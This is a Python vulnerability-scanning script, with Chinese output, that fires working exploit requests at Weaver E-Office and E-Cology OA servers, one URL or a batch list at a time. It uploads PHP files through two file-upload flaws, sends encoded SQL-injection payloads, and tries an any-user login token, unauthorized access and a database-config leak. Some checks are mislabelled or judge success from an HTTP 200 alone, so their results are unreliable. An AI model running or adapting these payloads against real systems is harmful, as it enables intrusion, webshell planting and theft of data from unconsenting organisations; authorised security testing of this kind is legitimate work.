import requests
import sys
import re
import base64


requests.packages.urllib3.disable_warnings()


def pocs(url):
    baseurl = url.strip()      # 去除行尾换行符
    print("\n")
    flag = f"测试url：{baseurl}"
    print(f"\033[1;33m{flag}\033[0m")
    print("\n")
    CVE_2023_2523(baseurl)
    CVE_2023_2648(baseurl)
    CVE_2023_15672(baseurl)
    CNVD_2023_12632(baseurl)
    e_cology_apiSQLinj(baseurl)
    e_cology_ofsLogin_anyusers_login(baseurl)
    QVD_2023_9849(baseurl)
    UserSelect_unauthorized(baseurl)
    mysql_config_db_infoleak(baseurl)



def CVE_2023_2523(baseurl):
    flag = "正在检测泛微 E-Office文件上传漏洞（CVE-2023-2523)"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
    # 设置请求头
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }

    # 设置表单数据,base64编码
    data = 'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZFJWQ0dXcTRDeDNTcTZ0dApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwbG9hZF9xdXdhbiI7IGZpbGVuYW1lPSJ0ZXN0LnBocC4iCkNvbnRlbnQtVHlwZTogaW1hZ2UvanBlZwoKPD9waHAgcHJpbnQoMjU2KiAyNTYpOyB1bmxpbmsoX19GSUxFX18pOz8+Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWRSVkNHV3E0Q3gzU3E2dHQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9IiIKQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0KIAogCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWRSVkNHV3E0Q3gzU3E2dHQtLQ=='

    try:
        response = requests.post(testurl, headers=headers, data=base64.b64decode(data), timeout=5)
        if response.status_code == 200 and "test.php" in response.text:
            matches = re.findall(r"(\d{10})", response.text)
            url = baseurl + "attachment/" + matches[1] + "/test.php"
            resp = requests.get(url)
            if resp.status_code == 200 and "65536" in resp.text:
                result = f"[+]存在泛微 E-Office文件上传漏洞（CVE-2023-2523)！建议手动复验确认！url:{baseurl}"
                print(f"\033[1;31m{result}\033[0m")
            else:
                result = "[-]不存在泛微 E-Office文件上传漏洞（CVE-2023-2523)"
                print(f"\033[0;32m{result}\033[0m")
        else:
            result = "[-]不存在泛微 E-Office文件上传漏洞（CVE-2023-2523)"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")

def CVE_2023_2648(baseurl):
    flag = "正在检测泛微 E-Office文件上传漏洞(CVE-2023-2648)"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'inc/jquery/uploadify/uploadify.php'
    # 设置请求头
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }

    # 设置表单数据,base64编码
    data = 'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZFJWQ0dXcTRDeDNTcTZ0dApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkZkaWxlZGF0YSI7IGZpbGVuYW1lPSI0NDQucGhwLiIKQ29udGVudC1UeXBlOiBpbWFnZS9qcGVnCiAKPD9waHAgcHJpbnQoMjU2KiAyNTYpOyB1bmxpbmsoX19GSUxFX18pOz8+Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWRSVkNHV3E0Q3gzU3E2dHQ='

    try:
        response = requests.post(testurl, headers=headers, data=base64.b64decode(data), timeout=5)
        if response.status_code == 200:
            matches = re.findall(r"(\d{10})", response.text)
            url = baseurl + "attachment/" + matches[0] + "/444.php"
            resp = requests.get(url)
            if resp.status_code == 200 and "65536" in resp.text:
                result = f"[+]存在泛微 E-Office文件上传漏洞（CVE-2023-2523)！建议手动复验确认！url:{baseurl}"
                print(f"\033[1;31m{result}\033[0m")
            else:
                result = "[-]不存在泛微 E-Office文件上传漏洞（CVE-2023-2523)"
                print(f"\033[0;32m{result}\033[0m")
        else:
            result = "[-]不存在泛微 E-Office文件上传漏洞（CVE-2023-2523)"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")

def CVE_2023_15672(baseurl):
    flag = "正在检测泛微E-Cology SQL注入漏洞(CVE-2023-15672)"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+\'0:0:5\'&isFromOutImg=1'
    # 设置请求头
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    try:
        response = requests.post(testurl, headers=headers, timeout=5)
        if response.status_code == 200:
            result = f"[+]存在泛微E-Cology SQL注入漏洞(CVE-2023-15672)！建议手动复验确认！url:{baseurl}"
            print(f"\033[1;31m{result}\033[0m")
        else:
            result = "[-]不存在泛微E-Cology SQL注入漏洞(CVE-2023-15672)"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")


def CNVD_2023_12632(baseurl):
    flag = "正在检测泛微OA E-Cology9未授权SQL注入漏洞(CNVD-2023-12632)"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'mobile/plugin/browser.jsp'
    headers = {'Upgrade-Insecure-Requests': '1',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'x-forwarded-for': '127.0.0.1',
               'x-originating-ip': '127.0.0.1',
               'x-remote-ip': '127.0.0.1',
               'x-remote-addr': '127.0.0.1',
               'Content-Type': 'application/x-www-form-urlencoded'}
    data = "isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537"
    try:
        response = requests.post(testurl, verify=False, timeout=5, headers=headers, data=data)
        if 'Microsoft SQL Server' in response.text:
            result = f"[+]存在泛微OA E-Cology9未授权SQL注入漏洞(CNVD-2023-12632)！建议手动复验确认！url:{baseurl}"
            print(f"\033[1;31m{result}\033[0m")
        else:
            result = "[-]不存在泛微OA E-Cology9未授权SQL注入漏洞(CNVD-2023-12632)"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")

def e_cology_apiSQLinj(baseurl):
    flag = "正在检测泛微OA e-cology前台接口SQL注入漏洞"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    data = "formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1"
    try:
        response = requests.post(testurl, headers=headers, data=data, timeout=5)
        if response.status_code == 200 and "id" in response.text:
            result = f"[+]存在泛微OA e-cology前台接口SQL注入漏洞！建议手动复验确认！url:{baseurl}"
            print(f"\033[1;31m{result}\033[0m")
        else:
            result = "[-]不存在泛微OA e-cology前台接口SQL注入漏洞"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")

def e_cology_ofsLogin_anyusers_login(baseurl):
    flag = "正在检测泛微 e-cology ofsLogin任意用户登录漏洞"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp'
    try:
        response = requests.get(testurl, timeout=5)
        if response.status_code == 200:
            result = f"[+]存在泛微 e-cology ofsLogin任意用户登录漏洞！建议手动复验确认！url:{baseurl}"
            print(f"\033[1;31m{result}\033[0m")
        else:
            result = "[-]不存在泛微 e-cology ofsLogin任意用户登录漏洞"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")

def QVD_2023_9849(baseurl):
    flag = "正在检测泛微E-Cology /CheckServer.jsp路径SQL注入漏洞(QVD-2023-9849)"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'mobile/plugin/CheckServer.jsp?type=mobileSetting'
    headers = {
        "Connection": "close"
    }
    try:
        response = requests.get(testurl, headers=headers, timeout=5)
        if response.status_code == 200 and "system error" in response.text:
            result = f"[+]存在泛微E-Cology /CheckServer.jsp路径SQL注入漏洞(QVD-2023-9849)！建议手动复验确认！url:{baseurl}"
            print(f"\033[1;31m{result}\033[0m")
        else:
            result = "[-]不存在泛微E-Cology /CheckServer.jsp路径SQL注入漏洞(QVD-2023-9849)"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")

def UserSelect_unauthorized(baseurl):
    flag = "正在检测泛微E-Office UserSelect未授权访问漏洞"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'UserSelect/'
    headers = {
        "Content-Type": "application/json"
    }
    try:
        response = requests.get(testurl, headers=headers, timeout=5)
        if response.status_code == 200:
            result = f"[+]存在泛微E-Office UserSelect未授权访问漏洞！建议手动复验确认！url:{baseurl}"
            print(f"\033[1;31m{result}\033[0m")
        else:
            result = "[-]不存在泛微E-Office UserSelect未授权访问漏洞"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")

def mysql_config_db_infoleak(baseurl):
    flag = "正在检测泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞"
    print(f"\033[0;34m{flag}\033[0m")
    testurl = baseurl + 'mysql_config.ini'
    headers = {
        "Content-Type": "application/json"
    }
    try:
        response = requests.get(testurl, headers=headers, timeout=5)
        if response.status_code == 200 and "dataurl" in response.text:
            result = f"[+]存在泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞！建议手动复验确认！url:{baseurl}"
            print(f"\033[1;31m{result}\033[0m")
        else:
            result = "[-]不存在泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞"
            print(f"\033[0;32m{result}\033[0m")
    except Exception as e:
        print(e)
        print("测试失败,响应超时")


def geturl_from_file(filename):
    with open(filename, "r") as f:
        url_list = f.readlines()
    return url_list

if __name__ == '__main__':
    logo = "author： kuang-zy\nGitHub： https://github.com/kuang-zy"
    print(f"\033[1;36m{logo}\033[0m")
    print("\n")
    try:
        if sys.argv[1] == '-u':
            url = sys.argv[2]
            pocs(url)
        elif sys.argv[1] == "-f":
            filename = sys.argv[2]
            urls = geturl_from_file(filename)
            for url in urls:
                pocs(url)
        elif sys.argv[1] == "-h":
            print("-h\t\t输出本帮助菜单")
            print("-u url\t\t单个url进行poc检测,例：-u https://www.baidu.com/ (注意：最后的\"/\"一定要加上)")
            print("-f filename\t批量检测，一行放一个url保存到txt中,例：-f targets.txt")
        else:
            print("输入\"-h\"查看使用帮助")
    except Exception as e:
        print("输入\"-h\"查看使用帮助")
